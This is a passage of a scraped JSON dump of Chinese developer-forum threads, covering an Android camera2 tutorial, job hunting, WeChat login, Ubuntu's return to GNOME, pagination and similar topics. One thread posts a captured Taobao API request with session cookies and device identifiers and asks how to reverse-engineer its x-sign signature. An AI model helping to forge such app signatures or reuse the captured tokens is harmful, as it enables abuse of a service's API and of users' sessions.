---------- | ---- | \r", "| 数学 | 1 | 张三 | 2015-01-04 | 80 | \r", "| 语文 | 1 | 张三 | 2015-01-05 | 80 | \r", "| 语文 | 1 | 李四 | 2015-01-05 | 90 | \r", "\r", "\r", "--------------------------------------------------------------------------------------------------------\r", "如果是筛选 10 位同学,外层还需再套一层 最好通过生成临表再进行筛选减少运算次数"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>前言</h2>\n<p>笔者因为项目需要自定义相机，所以了解了一下 Android 关于 camera 这块的 API 。 Android SDK 21 （ LOLLIPOP ） 开始已经弃用了之前的 Camera 类，提供了 camera2 相关 API ，目前网上关于 camera2 API 介绍的资料比较少，笔者搜集网上资料，结合自己的实践，在这里做一个总结。</p>\n<h2>流程</h2>\n<p>因为 camera2 提供的接口比较多，虽然很灵活，但是也增加了使用的复杂度。首先来大致了解一下调用 camera2 的流程，方便我们理清思路。</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/1745101-cf29fb696111cee2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>要显示相机捕捉的画面，只需要三步：初始化相机，预览，更新预览。也就是上图中左侧的部分。要实现这三步，需要用到的主要接口类和它们的作用步骤如上图右侧部分所示。下面就用代码来详解一下。</p>\n<h2>案例</h2>\n<p>首先创建一个相机界面：</p>\n<blockquote>\n<p>activity_camera.xml</p>\n</blockquote>\n<pre><code>&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"wrap_content\"\n    android:orientation=\"vertical\"&gt;\n    \n    &lt;TextureView\n            android:id=\"@+id/camera_texture_view\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"match_parent\" /&gt;\n\n    &lt;ImageButton\n            android:id=\"@+id/capture_ib\"\n            android:layout_width=\"60dp\"\n            android:layout_height=\"60dp\"\n            android:layout_marginBottom=\"10dp\"\n            android:layout_gravity=\"bottom|center\"\n            android:background=\"@drawable/send_pres\"/&gt;\n\n&lt;/LinearLayout&gt;\n\n</code></pre>\n<p>界面很简单，只有一个 TexureView 和一个按钮。\n接下来在 Activity 中初始化并显示相机捕捉的画面。</p>\n<p>首先要解决的一个问题就是画面拉伸的问题。\n要解决这个问题，首先要从 TextureView 下手。</p>\n<blockquote>\n<p>CameraActivity.java</p>\n</blockquote>\n<pre><code>mTextureView.setSurfaceTextureListener(new TextureView.SurfaceTextureListener() {\n            @Override\n            public void onSurfaceTextureAvailable(SurfaceTexture surfaceTexture, int width, int height) {\n                mWidth = width;\n                mHeight = height;\n                getCameraId();\n                openCamera();\n            }\n\n            @Override\n            public void onSurfaceTextureSizeChanged(SurfaceTexture surfaceTexture, int i, int i1) {\n\n            }\n\n            @Override\n            public boolean onSurfaceTextureDestroyed(SurfaceTexture surfaceTexture) {\n                return false;\n            }\n\n            @Override\n            public void onSurfaceTextureUpdated(SurfaceTexture surfaceTexture) {\n\n            }\n        });\n</code></pre>\n<p>在 onSurfaceTextureAvailable 中初始化相机。通过 CameraManager 对象 openCamera ，这正是流程图中 Init 步骤中的第一步。 openCamera 有三个参数，第一个是 String 类型的 cameraId ，第二个是 CameraDevice.StateCallback ，第三个是 Handler 。这里我们要声明一个 StateCallback ：</p>\n<pre><code>private CameraDevice.StateCallback mCameraDeviceStateCallback = new CameraDevice.StateCallback() {\n        @Override\n        public void onOpened(CameraDevice cameraDevice) {\n            mCameraDevice = cameraDevice;\n            createCameraPreview();\n        }\n\n        @Override\n        public void onDisconnected(CameraDevice cameraDevice) {\n            mCameraDevice.close();\n            mCameraDevice = null;\n        }\n\n        @Override\n        public void onError(CameraDevice cameraDevice, int i) {\n            mCameraDevice.close();\n            mCameraDevice = null;\n        }\n    };\n</code></pre>\n<p>可以看到，在 camera 准备完毕之后就可以创建预览界面了。解决画面拉伸的问题就是要为预览界面设置一个合适比例的 SurfaceTexture buffer size 。</p>\n<pre><code>private void createCameraPreview() {\n        try {\n            SurfaceTexture texture = mTextureView.getSurfaceTexture();\n            assert texture != null;\n            CameraCharacteristics characteristics = mCameraManager.getCameraCharacteristics(mCameraId);\n            StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);\n            int deviceOrientation = getWindowManager().getDefaultDisplay().getOrientation();\n            int totalRotation = sensorToDeviceRotation(characteristics, deviceOrientation);\n            boolean swapRotation = totalRotation == 90 || totalRotation == 270;\n            int rotatedWidth = mWidth;\n            int rotatedHeight = mHeight;\n            if (swapRotation) {\n                rotatedWidth = mHeight;\n                rotatedHeight = mWidth;\n            }\n            mPreviewSize = getPreferredPreviewSize(map.getOutputSizes(SurfaceTexture.class), rotatedWidth, rotatedHeight);\n            texture.setDefaultBufferSize(mPreviewSize.getWidth(), mPreviewSize.getHeight());\n            Log.e(\"CameraActivity\", \"OptimalSize width: \" + mPreviewSize.getWidth() + \" height: \" + mPreviewSize.getHeight());\n            ...\n</code></pre>\n<p>这里根据当前设备及传感器的旋转角度来判断是否交换宽高值，然后通过 CameraCharacteristics 来得到最适合当前大小比例的宽高，然后把这个宽高设置给 SurfaceTexture 。</p>\n<pre><code>private Size getPreferredPreviewSize(Size[] sizes, int width, int height) {\n        List&lt;Size&gt; collectorSizes = new ArrayList&lt;&gt;();\n        for (Size option : sizes) {\n            if (width &gt; height) {\n                if (option.getWidth() &gt; width &amp;&amp; option.getHeight() &gt; height) {\n                    collectorSizes.add(option);\n                }\n            } else {\n                if (option.getHeight() &gt; width &amp;&amp; option.getWidth() &gt; height) {\n                    collectorSizes.add(option);\n                }\n            }\n        }\n        if (collectorSizes.size() &gt; 0) {\n            return Collections.min(collectorSizes, new Comparator&lt;Size&gt;() {\n                @Override\n                public int compare(Size s1, Size s2) {\n                    return Long.signum(s1.getWidth() * s1.getHeight() - s2.getWidth() * s2.getHeight());\n                }\n            });\n        }\n        return sizes[0];\n    }\n</code></pre>\n<p>这里 Sizes 是相机返回的支持的分辨率，从我们传递的参数找找到一个最接近的分辨率。</p>\n<p>接下来就要通过 CaptureRequest.Builder 以及 CameraCaptureSession.StateCallback 来创建及更新预览界面：</p>\n<pre><code>...\nSurface surface = new Surface(texture);\n            mBuilder = mCameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);\n            // 设置预览对象\n            mBuilder.addTarget(surface);\n            mCameraDevice.createCaptureSession(Arrays.asList(surface), new CameraCaptureSession.StateCallback() {\n                @Override\n                public void onConfigured(CameraCaptureSession cameraCaptureSession) {\n                    if (null == mCameraDevice) {\n                        return;\n                    }\n                    mSession = cameraCaptureSession;\n                    mBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);\n                    try {\n                        // 不停地将捕捉的画面更新到 TextureView\n                        mSession.setRepeatingRequest(mBuilder.build(), mSessionCaptureCallback, mBackgroundHandler);\n                    } catch (CameraAccessException e) {\n                        e.printStackTrace();\n                    }\n                }\n\n                @Override\n                public void onConfigureFailed(CameraCaptureSession cameraCaptureSession) {\n                    Toast.makeText(CameraActivity.this, \"Camera configuration change\", Toast.LENGTH_SHORT).show();\n                }\n            }, null);\n        } catch (CameraAccessException e) {\n            e.printStackTrace();\n        }\n</code></pre>\n<h2>这样就完成了自定义相机第一步，<a href=\"https://github.com/KenChoi1992/camera2\" rel=\"nofollow\">源码地址请戳这里。 </a></h2>\n<blockquote>\n<p>作者： KenChoi - 极光（ JPush 为极光团队账号，欢迎关注）</p>\n</blockquote>\n<blockquote>\n<p>原文：<a href=\"http://www.jianshu.com/p/d05b319eacc8\" rel=\"nofollow\">Android 用 camera2 API 自定义相机</a></p>\n</blockquote>\n<blockquote>\n<p>知乎专栏：<a href=\"https://zhuanlan.zhihu.com/jiguang-daily\" rel=\"nofollow\">极光日报</a></p>\n</blockquote>\n</div></div>"], "reply": "目前尚无回", "tittle": "Android 用 camera2 API 自定义相机", "comment": []},
{"content": "", "reply": "目前尚无回", "tittle": "如何写短信压力测试程序", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>GET https://acs.m.taobao.com/gw/mtop.taobao.sharepassword.querypassword/1.0/?data=%7B%22passwordType%22%3A%22tao%22%2C%22passwordContent%22%3A%22%EF%BC%9A%EF%BF%A51%EF%BF%A5%22%7D HTTP/1.1\nx-appkey: 21646297\nx-nq: WIFI\nx-mini-wua: HHnB_%2BcwyKNIC%2B4803rEsv5gvRSMLHtR7OVKEVRh40sALqUBhf1azCV%2B3xH6jIS0ntLnGlLNLUXPv%2BlIMdUITW4J5VcvE8FniKHdUQRP5VOTDu9o%3D\nx-c-traceid: WOVEiQs1HBgDAFnA8qAEL8gK14914816703030026131374\nx-features: 27\nx-app-ver: 6.6.0\nx-t: 1491481670\nx-pv: 5.1\nx-page-name: com.taobao.tao.detail.activity.DetailActivity\nx-location: 119.260871%2C26.105449\nf-refer: mtop\nuser-agent: MTOPSDK%2F3.0.0.2-AVMP+%28Android%3B7.1.1%3BXiaomi%3BMi-4c%29\nx-ttid: 212200%40taobao_android_6.6.0\nCookie: cna=szJsER0zyEkCAST7FjnbGh0n; t=c491a06a7676ab53a129ee088ff42f4b; l=AqKiGocEmiL4NnMRiFomYLmK8jME86YN; isg=AlNThiMgD5_YacNLsy9zM-Hg6dXDm-fKmKy_DwVwr3KphHMmjdh3GrHUzE4V\nx-nettype: WIFI\ncache-control: no-cache\na-orange-q: appKey=21646297&amp;appVersion=6.6.0&amp;clientAppIndexVersion=1120170406193606490&amp;clientVersionIndexVersion=0\nx-utdid: WOVEiQs1HBgDAFnA8qAEL8gK\nx-umt: qJgg%2FQgG0ZP4RsWY5OFQKAw5pu%2BrTRML\nx-devid: At9DXPEq1Q7OesScNit8NcW2ew6HPwjAHJ83gIkrw7BH\nx-sign: ab203800404dd8d29e5de05726e8c6d13d4d951aadbcdcd79c\nx-page-url: http%3A%2F%2Fitem.taobao.com%2Fitem.htm\nx-unitinfo: center\nHost: acs.m.taobao.com\nAccept-Encoding: gzip\nConnection: Keep-Alive\n\n</code></pre>\n<p>上边x-sign是签名\n下边是必须传入的数据</p>\n<pre><code>x-appkey: 2164629\nx-features: 27\nx-t: 1491464656\nx-pv: 5.1\nx-location: 119.260871,26.105449\nx-ttid: 212200@taobao_android_6.6.0\nx-utdid: WOVEiQs1HBgDAFnA8qAEL8gK\nx-devid: At9DXPEq1Q7OesScNit8NcW2ew6HPwjAHJ83gIkrw7BH\nx-sign: ab203800401f000173d12925bd771d4acf6bab1b11772673cf\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "某淘口令有个签名求算法大神分析一下", "comment": ["ab20380040 是固定的，后边的应该是 SHA1 加密或者 HmacSHA1", "做淘客推广？这样是白搭的，有别的办法，可以私我。。。。 IHFxOjUyMjE4MTI2OQ=="]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这几天面了几家公司</p>\n<p>有些公司面试的问题挺合我胃口，感觉是技术导向的公司，但是薪资水平不咋地</p>\n<p>有的公司面试的问题让我有一种被问到 1+1 等于几的感觉</p>\n<p>然而这两家公司招聘信息上写的薪资水平其实差不多。</p>\n<p>为啥会出现这种情况</p>\n<p>p.s.后面的那个理论上来说应该算是外包公司，感觉在外包公司干多了会变傻。。。</p>\n</div></div>"], "reply": "10", "tittle": "最近找工作遇到挺多蛋疼的事", "comment": ["第一家是创业公司？靠情怀和画饼？", "珍爱生命，远离外包", " 也可能是我提的太高了？\r", "我不是很了解行情 😂 就很尴尬", "面试题不决定工作内容，还是分开看吧", "一楼和楼主的头像，我发现了什么 ", " ", "你投简历前最好先了解一下公司", "拿到 offer 先，很多公司薪资乱写的，还不一定招人。", "陪睡了吗？", "面试题跟面试官的关系很大，如果面试官水平不行的话就辩证性地看待未来同事如何相处这问题了。\r", "薪资水平达不到要求，要么谈要求，要么就真的不行，也没啥办法。面试题这种东西，准备准备就可以了。", " 我倒是想 ", "   ", " "]},
{"content": ["<div class=\"topic_content\">1 ，第一次登录，点击用户点击允许获取信息登录后，后面其他页面的操作中，如何判断此用户是否处于登录状态？\r<br>2 ，对于已经授权的用户，如何在今后的登录过程中直接跳到已登录的界面，不再需要点登录按钮？有朋友说判断为已登录用户后，用静默方式执行再登录。但是静默方式不是也要请求 accsess token 这些接口吗？能不能不请求？</div>"], "reply": "15", "tittle": "微信网页授权登录如何判断登录状态", "comment": ["1 ，跟一般登录一样 cookie 保存登录状态啊  ", "2 ，微信的 token 是能延长时间的。如果你是想授权一次永远不再用微信的接口的话，不行吧。", "跟服务器换一个 7 天有效期的 sid ，这个 sid 有效期比微信授权的 access_token 短", " 延长时间用 refresh token 吗，这样会不会出现进去又出现登录按钮", " 请问大神这个 sid 接口文档在哪里？", "github 有个 itchat 项目", " 干啥用的？", "微信登录只是验证的一部分，后续登录态和鉴权还是一样的呀", " 后续登录还是用网站的 cookie 是吗？", " 看一看不就知道了。", " 是的，微信登录成功只是代表用户已验证，但状态保持和鉴权还是你自己系统实现的", " 明白了，感谢！", "直接读 cookies ，我是这么干的。", " 听说微信内 cookie 保存时间很短是吗？还有人说关闭网页， cookie 就删除了，兄弟碰到的是什么情况呢？", " 可以正常使用", " 感谢！"]},
{"content": ["<div class=\"topic_content\">来源： <a target=\"_blank\" href=\"https://insights.ubuntu.com/2017/04/05/growing-ubuntu-for-cloud-and-iot-rather-than-phone-and-convergence/\" rel=\"nofollow\">https://insights.ubuntu.com/2017/04/05/growing-ubuntu-for-cloud-and-iot-rather-than-phone-and-convergence/</a></div>"], "reply": "63", "tittle": "Ubuntu 18.04 将放弃 Unity 重回 GNOME", "comment": ["unity 丑了好多年，终于换回来了！😂", "Gnome 才是最吼的。", "不是 mate? gnome 有啥好？", "unity 8 呢？", " 17.04 使用的是 Unity 8, 几天后就正式发布，然而还没正式发布就确定要死了.\r", "\r", "文章里有说：\r", "\r", "What the Unity8 team has delivered so far is beautiful, usable and solid, but I respect that markets, and community, ultimately decide which products grow and which disappear.", " \r", " \r", "根据上面那段，是被市场和社区钦定了", " 主要是又丑又耗资源。。。", " 不过说实话，感觉 Unity8 还挺漂亮", "Unity 很好看啊，还有菜单合并到顶部面板。\r", "伤心，软件经常是越更新越烂", "Unity 这默认的紫色就受不了", "unity 装个 numix 图标，主题，换个壁纸，改个字体，简直完美。\r", "gnome 也可以配置得很不错，但总差点意思。", "Ubuntu 这个审美 这个重口味。感觉还是 fedora 审美高", "有直接用远程 shell 不折腾图形桌面的 linux 开发用户吗", "吼啊", " 表示我在电脑上装的 Ubuntu16.04 server 版本，平时也是各种 xshell", "我是非常非常喜欢 Unity ，非常非常不喜欢 Gnome 。。。 \r", "\r", "听到这个消息我是相当失望，看看明年的 Ubuntu Gnome 能是个什么样吧。", "现在常用的软件就那么几个，用什么 de 感觉区别都不大了，换就换吧", " 我是没办法接受，没有浏览器就挺伤的", " 你是什么图形界面都不装，不用 Windows 不用 Mac ，只用 shell ？", " Windows 和 mac 远程过去的 毕竟要浏览器的", "我倒是觉得 gnome 丑。。 unity 漂亮。。", "unity 装个主题很漂亮啊", "并不关心，自带什么用什么", "感觉和 Windows 操作相差无几了呀", "我很喜欢 unity ，换个图标真的很漂亮。\r", "\r", "gnome 怎么弄成像 macOs 一样的全局菜单？", "我还是喜欢老的 Gnome ，菜单在顶部的那个，大概是 10.10 之前的版本？\r", "当时用某个很流行的调节工具一顿调整以后很清爽", "只有 unity 能做到让 Chrome 火锅之类软件有 mac 一样的全屏， Gnome 那个顶栏简直无法接受", "不感冒，个人喜欢 debian 的命令行。", "别的发行版都在跳出 Gnome3 的大坑，怎么 Ubuntu 还跳回去了……", " 现在用 GNOME 的是越来越多吧", "只要 Ubuntu 的那个基佬紫不在出现就好。", " 感觉是嘴硬， unity 8 像他说的这么好会没有市场？况且搞了这么长时间了，要是没有市场现在才反应过来？反射弧得多短", " 主要还是移动市场失败了，最初可能想通过\r", "Unity 打开移动市场，但是现在觉得再继续不够划算了，估计可能还要裁员吧", " Ubuntu 发行版又不是只有 ubuntu 本身，还有 Kubantu ， Lubantu ， Xubantu ， Ubuntu Gnome ，全是官方和社区承认的版本。\r", "\r", "再说了，原本 Unity8 是准备打造一个跨平台桌面环境准备的。现在 Ubuntu Phone 计划搁浅，自然准备再另寻出路。", "可惜了，我还挺喜欢 Unity", "接受不了 Gnome 的标题栏，又大又丑，喜欢 Unity ，有全局菜单，不知道 Gnome 怎么弄", "18.04 一八年?", " 我试了 Unity, Xfce, GNOME, KDE, 个人接受程度排名：\r", "Xfce > Unity > KDE > GNOME\r", "KDE 主要是一些工具软件好用\r", "GNOME 感觉是给触摸设备而不是键鼠设计的", " 还没有确切消息，按之前的规律，应该是 18 年 4 月", "KDE 党推荐一下 deepin15.4, 就是里面的上游软件旧了点.", "终于熬出头了！我每回装 Ubuntu 都要刷回 Gnome ，真是神烦。。。", "反正还是用 xfce", "   几百年不用 ubuntu 了...当时还是铁粉啊 现在用 elementos 了", " #41 ", "\r", " ", " ", "这个不是关键，关键是弃用 mir 改用 wayland 是重大好消息", "用了一阵子 unity 感觉还算顺手 不过由于不稳定内存占用也不小就换了 xfce 下次装机准备直接上 xfce 版的 linuxmint", " Xfce 用过一次觉得好丑就没用了，现在不知道怎样", "然而用了 linuxmint 三年了，不打算换回去，反正 mint 也是基于 ubuntu", "i3wm 围观你们撕起来", "awesome 用户路过", " 还是丑", "还是喜欢 gnome2 ……", "16.04 在 7 代平台下貌似都不能从 U 盘启动。。。", "因为 unity 难看难用就换成了 mint 的 mate 。", " 你还可以试试 Cinnamon.", " 用了 adapta 主题还可以，不过还是有点粗糙", "de 倾向于 xfce ， wm 倾向于 i3 ，不过现在一般都 mac 直接 ssh 过去，没特殊情况基本不装图形化界面", " 看了一下跟 Xfce 好像…", " Unity, GNOME 都越来越臃肿，越来越难用了，所有的 DE 都一窝蜂的往触控方向发展，桌面反倒是越来越难用了。\r", "\r", "MATE 大法好～", " 官方有 gnome 版， ", "还是喜欢 Unity... Unity 用习惯了比任何一个桌面环境都要高效", "个人感觉 unity 是最好看的，尤其是顶部的菜单栏。。在 youtube 上看了下 unity8 的预览视频， unity8 很炫酷。。。", "早已弃坑入洗发水， gnome 是最吼的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做一个带十个人小团队开发主管的体验大概还是知道一些的，项目上要对上负责，安排工作任务，把控进度。技术上你要能指导新员工，自己积累的经验要足以帮别人解决大部分 bug 。你完全 coding 的时间很可能少到五成到七成，其余时间回邮件，答疑，扯皮，开会等等。</p>\n<p>做一个很大事业部的领导是什么体验呢？（四十多岁，事业有成，不用担心诸如三十五岁之后裁员的问题）</p>\n<p>是不是基本不需要写代码或者完成具体事务上的工作，只要管理一整个部门，开会，回邮件，审批电子流就行了？</p>\n</div></div>"], "reply": "34", "tittle": "做领导（大公司领导一个部门）是什么体验？", "comment": ["我知道多半不会这个点不睡觉在这刷帖子的……", "我来围观了，这个年龄这样的工作细节其实不错的啊，没毛病", " 主管还是能看得到的，领导的生活离得太远，所以很好奇他们的生活是什么样子，压力有多大？\r", "\r", "还有最重要的，都是怎么坐上去的，好像程序员换工作比较厉害，但是想要升职至少得在这家企业呆个三年以上吧。\r", "\r", "我说的是从开发做上去的领导，比如你在一个不大也不小的公司，负责一个产品线，手下开发啊测试啊需求啊实施啊市场啊都归你管。", "你这知乎风味的标题都写好了,不去知乎上发一贴吗?", " 来去之间每天的工作是刷微博，不知道是他自己刷的，还是找大胸妹代刷的", "如果还需要在这里问这个问题，只能说明 you are not ready", "block 数量有限制吗", "“美联储是比 ISIS 更加可恶的恐怖组织了”", "无论如何请不要太在意", " 他关注我了，从这一点看，应该是自己刷的", "累成狗，就这样。。。。", "去知乎发吧，后面就有各种人物设定来跟你说他们的故事了\r", "\r", "我是一个销售总监， 18 岁我高中辍学，从一个底层销售干起....（省略 10000 字）....现在手下已经 100 多员工\r", "我是某上市集团的 CFO ，硕士毕业就在这家公司，经历了职场风云、领导变动....（省略 10000 字）....现在手下已经 1000 多员工\r", "\r", "叼叼叼！！！！！", "\"三十五岁之后裁员\"  菊花厂？", "coding 时间减少到 0 成或者最多 2 成... reviewing 的时间反而大于 coding 的时间.\r", "其他的么如楼主最后一段所说, 和人打交道的时间替代了和机器打交道的时间.", "就是到处扯皮", "审批电子流？写胶片？", "坐哪，担责任，背锅，救火。\r", "工作内容就是尽量的让手下少出错。只要不出错 你天天推小妹子 都没事！", "坐等大神回答，反正不是实名的，扯扯呗 [瓜子][饮料][小板凳]", "我以为我来到了知乎。。", "知乎大人物很多啊", "几万人的算吗？你可以去找西西河忙总的谈管理系列文章看，不过他是金融口不是 IT 。忙总是我网上接触过的职位最高的网友了，当然他跟逼乎众还不能比。", "多想有个这样的领导", "开会开会开会开会开会开各种各样的会", "一股子知乎味", "领导都是游手好闲得，话说有的人前半生努力，就为了后半生游手好闲，有的人刚好相反，前半生游手好闲", "不知道我这辈子能不能体验到这个体验", " 就是因为知乎编故事的人太多才想在这里问问的。\r", "\r", "这里不可能全都是五年工作经验以下的吧，正常在一个大公司工作个十年，管理一个小产品线的交付，手底下几十号人，有自己独立的办公室应该是能做到的吧。\r", "\r", "我说的是中层领导，最底层管十个人的主管我知道，太高层的，比如 CTO ，比如大公司余大嘴那样的，压力肯定也不小。那种不上不下的领导是什么样的？\r", "\r", "财务能不能自由？\r", "压力大不大？\r", "平时都干些啥？\r", "风险大不大？", " 这都被你发现了。我已经惯例出来好好做人了。", " 我当然 not ready 没资格做领导啦，而且领导生活离得太远看都看不到。所以才想办法上来问问", "不同人在不同公司的不同职位处于不同环境和不同状况下是不一样的吧。\r", "\r", "我的上司喜欢以一个“银弹”的角色在公司的各个岗位游走，发现问题，找到方案，解决问题，让整个公司像程序一样高效地运转。", " that's me....", " 嗯？", " 我现在也在尝试这种把团队当一个程序一样的管理方式…", " 为人写程序好像比为计算机写程序困难"]},
{"content": ["<div class=\"topic_content\">觉得还是修改一下标题比较好, 就这样了.\r<br>\r<br>下图里以非常规存在的 Seller 及 Developer, 让开发者中心客服给予相关解释, 开发者中心的解释是, 一款 App 如果正常上架了那说明已经通过了他们对于开发者的审核, 没有任何问题.\r<br>\r<br>然而这只是由一个普通个人帐号发布的冒牌 Game Center 游戏...\r<br>\r<br>我找到的不仅有名称叫\"Game Center\"的, 还有\"gamecenter\",\"game center\", 等等...\r<br>\r<br>个人觉得只有两种可能:\r<br>1.早期的个人开发者帐号\r<br>2.通过以公司名义跟 Apple 交涉, 得以修改掉了开发商 (参见新浪微博, 汽车之家客户端), 但是这种小众的开发商也有这种权限?何况这对于 iOS 而言是个敏感词\r<br>\r<br><a target=\"_blank\" href=\"http://i.imgur.com/Rc46hDA.png\"><img src=\"http://i.imgur.com/Rc46hDA.png\" class=\"embedded_image\"></a></div>"], "reply": "2", "tittle": "关于 AppStore 里出现的一些奇葩开发商", "comment": ["感觉遇到了漏洞。", " 而且是成功绕过 Apple 相关部门知识库的漏洞"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>是否存在办法可以指定 Action 的执行顺序</p>\n<p>targetA: sub1 sub2\n{\nprintf(\"target\");\n}\nsub1 : a {\nprintf(\"sub1\");\n}\nsub2 : b {\nprintf(\"sub2\");\n}</p>\n<p>以上是范例，模式匹配的时候按照 sub1 sub2 的顺序 即（ a b),但是 Action 执行的顺序希望是 sub2 sub1 的顺序执行，\n即希望 output 结果 是  sub2sub1target\n请问有可能实现吗，如何实现？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "有了解 LEX&YACC 的进来讨论讨论", "comment": []},
{"content": ["<div class=\"topic_content\">遇到五种分页方式，大家都怎么处理：\r<br>\r<br>1 、 Discuz! 那种全功能分页：&lt;&lt; 1 2 3 ... 5 6 7 ... 31 32 33 &gt;&gt;\r<br>\r<br>2 、第 2 种是第 1 种的简化版： &lt; 上一页  6 下一页 &gt;\r<br>\r<br>3 、第 3 种是不显示页码，只显示：点击加载更多 / 或点击加载下一页\r<br>\r<br>4 、第 4 种是页面滚动到底部，自动加载下一页\r<br>\r<br>5 、第 5 种是第 4 种的加强版，在用户访问第 6 页时，就预加载第 7 页了（用户感觉不到已经加载了下一页）。</div>"], "reply": "62", "tittle": "“分页”的方式，大家通常怎么处理？", "comment": ["按照产品汪的需求来...", "还有就是没有分页按钮，通过事件触发加载下一页（更多）", "我喜欢第 2 种， PM 说现在流行第 4 ， 5 种。", " 比如，什么事件？", "我一般都是用第一种，后面再来个  跳转到[x]页  面", "实际体验来说，还是 1 比较好。。", "如果筛选条件过多, 能不算 total 就不算 total 呗", "第 4 第 5 种的缺点是无法从第 1 页直接跳到第 10 页。", "突然发现对于后台来说，好像都一样，只要你传参数过来......", "按照需求来。\r", "\r", "1 、有必要跳页，一般出现在作业系统的查询页，比如订单管理\r", "2 、过时了，但比较容易实现\r", "3 4 5 、没有必要跳页，这样比较简洁，怎么加载看需求", "比较喜欢 3", " 比如滚动到底部自动加载下一页，通过鼠标左右箭头翻页", "移动端用 4 ， 5 ：手机上点那一堆挨那么近的小页码很容易出错\r", "pc 端看需求，只用 1 或者 1 和 4 ， 5 结合；页面顶端使用方式 1 ，下拉到底部自动加载下一页\r", "\r", "当然最重要的是看 pm 怎么说", "我只想点个 footer 上的链接\r", "\r", "你却一直在加载下一页", "作为程序员，在测试的时候比较喜欢能操控到所有页面，一般是列出 1~N 的链接。顺便还添加一个 input 可以直接跳转。\r", "\r", "但是上线的时候，一般留个 1 2 3 .... N-2 N-1 N   以及 上一页 /下一页  第一页 /最后一页 的按钮", "个人感觉看场景吧，如果像是微博或者知乎那样的信息流结构，感觉 4 、 5 比较适用，如果像是订单之类的可能很多时候我都不会点击下一页，那么感觉 1 比较合适。可以加 telemetry 观测用户行为然后决定？", "我喜欢第一种,非常极其十分强烈讨厌第 4 种和第 5 种, 原因见我刚发的帖子 ", " 我也超级讨厌第 4 种，原因是我花了好几个小时还是找不到在知乎看到的那个回答。好气哦！！！！！！", "比较喜欢这种：\r", "下拉上一页，下滑下一页，永远只显示一页的内容（前端路由）", " 写反了，哈哈哈。", "讨厌无限下拉，上下页最舒服", "有时候我只是想看一下页面的 footer ，那些自动加载的让我很无奈", "python pagination", "纠正一下\r", "比较喜欢这种： \r", "下拉上一页，上滑下一页，永远只显示一页的内容（前端路由）", "看性能要求，如果千万级 or 亿级数据， 1 这种方式就有点吃力了，因为 1 这种方式 mysql 只能 offset limit 方式查询。所以只能 2 、 3 、 4 、 5", "按需", " 难道其他 4 种不是 offset limit ？", " \r", " \r", "同问，难道其他 4 种不是 offset limit ？", " \r", " \r", "哦，明白了，其他方式应该是 where time<xxxx limit xxx ，不用 offset", "这么明显的 A/B test 需求… \r", "不要瞎选，你把几个关键指标的监控放好，然后做 A/B Test ，每个样式给 5%-10%的用户，然后看看哪种样式的结果最好就行。例如停留时间，翻页点击等等", " +1.自动加载更多真的很烦。", "在性能方面来说，不跳页（或者说不往后跳页，往前跳可以通过缓存解决）是最好的，因为这时候查询就不需要 skip 了，不管从什么位置开始查，所需要的时间都是一样的。", "最讨厌第一种，特别是没有跳页的", "就产品设计初衷选择而言，在后台管理量级列表上 1 很实用，当然还有个跳页，比如各种 CMS 、 CRM 和 ERP ；在轻量级别的触屏版上 2 更加合适，比如 Google 触屏版的搜索；追求简洁设计的情况下，在 APP 上更多的会是 3 、 4 ，这个太多了就不说了。\r", "有交互的，我更加倾向使用 1 和 4 的集合版本，通过鼠标或者手指滑动触发加载前 3~5 页，然后后续显示分页组件，类似色魔张大妈的效果。\r", "\r", "然后，多嘴一下，我觉得 layui 的分页组件挺不错， ", " 。", "我就是想看总共有多少条记录 4 5 不满足吧", "在第一页的时候把 querystring 的参数都列全 让用户自己改 querystring 去\r", "比如\r", ";\r", "用户想翻页或者看第几条就自己改参数就好了", "所以后端接口直接提供 offset 和 limit 参数，前端随便玩去吧\r", "\r", " ", "非常讨厌下拉加载，不是社交类型的网站（用户喜欢刷刷刷的）千万别用。。。有的博客用这种方式，导致想找资料和文章，非常不方便。", "下拉加载都是 app 的模式， pc 还是第一种比较好\r", "不过确实要按照产品王的来最好", "整理得很全，收藏。", "原理一样,只是显示效果,这个你觉得哪个好选哪个", "如果只是表格数据，我喜欢不分页……\r", "\r", "\r", "\r", "如果要分页，我还是喜欢第一种。", "最好不要第一种，省的 count 算总页数", "1 的方式 比较吃性能。总数少还行，总数太大的话有点压力。 2 感觉最简单，体验也不错，加个跳页就完美了。 3 4 5 都给我滚……", "第一种的优化,不大量显示页码\r", "只针对当前页显示前 3 和后 3 页的直连外加一个用户自选跳转", "我在上一个项目，因为没要求就做了 4 ，而且也没有加载动画哈哈滑到底卡一下就加载了", "3,4,5 在电脑上是反人类的行为，当下拉多次之后右侧的滚动条会越来越短，如果这时我想回去看之前的内容，将会越来越难。", " 我也想说这个问题", " 对，淘宝就是这个样子，搞不懂既然这样设计，那 footer 存在的意义是什么？", "显示 《 < 1 ... 56789 ... 12 > 》\r", "我 github 上有一个 js 写的翻页方法，可以直接拿来 new", "自动加载太多非常烦，我明明是要去看 footer 里的内容的，但是如果要看到 footer 我还有很长的路要走，全是自动加载，烦死了。", " 完全可以拉下来自动加载，同时保留页数指示，可以随便跳。", "得看场景呀 比如看小说 你用 2,3,4,5 试试", "论坛帖子这种一般是 1 ，因为随时可能被回复顶上来\r", "4,5 适合 APP 每日推送新闻的那种，最新的东西一般都在上面 找几天前的东西这种需求比较少", "第二种，非常讨厌 4,5 因为很难找，也不知道什么时候刷到头", " \r", " \r", " \r", " \r", " \r", "\r", "我很想问候一下整出 3 ， 4 ， 5 这种必须要一页页翻的脑残设计 or 前端 or 产品，你们的灵感是不是来自于拉不尽的隔夜屎？", "不喜欢第 4 、第 5 种", 